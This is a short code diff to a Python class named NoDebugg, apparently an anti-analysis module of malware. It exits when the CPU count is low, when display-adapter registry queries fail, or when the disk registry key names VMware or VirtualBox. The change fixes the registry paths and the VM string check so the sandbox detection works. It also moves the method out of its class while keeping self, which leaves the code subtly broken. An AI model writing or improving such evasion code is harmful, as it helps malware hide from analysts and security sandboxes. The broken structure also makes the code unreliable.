@@ -1242,19 +1242,20 @@ class NoDebugg(Functions):
         if int(psutil.cpu_count()) <= 1:
             self.programExit()
 
-    def regkey(self):
-       reg1 = os.system(r'REG QUERY HKEY_LOCAL_MACHINE/SYSTEM/ControlSet001/Control/Class/{4D36E968-E325-11CE-BFC1-08002BE10318}/0000/DriverDesc 2> nul')
-       reg2 = os.system(r'REG QUERY HKEY_LOCAL_MACHINE/SYSTEM/ControlSet001/Control/Class/{4D36E968-E325-11CE-BFC1-08002BE10318}/0000/ProviderName 2> nul')
-        if (reg1 and reg2) != 1:
-            self.programExit()
+def regkey(self):
+    reg1 = os.system(r'REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000\DriverDesc 2> nul')
+    reg2 = os.system(r'REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000\ProviderName 2> nul')
 
-        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM//CurrentControlSet//Services//Disk//Enum')
-        try:
-            reg_val = winreg.QueryValueEx(handle, '0')[0]
-            if ("VMware" or "VBOX") in reg_val:
-                self.programExit()
-        finally:
-            winreg.CloseKey(handle)
+    if (reg1 and reg2) != 1:
+        self.programExit()
+
+    handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Services\Disk\Enum')
+    try:
+        reg_val = winreg.QueryValueEx(handle, '0')[0]
+        if "VMware" in reg_val or "VBOX" in reg_val:
+            self.programExit()
+    finally:
+        winreg.CloseKey(handle)
 
 
 
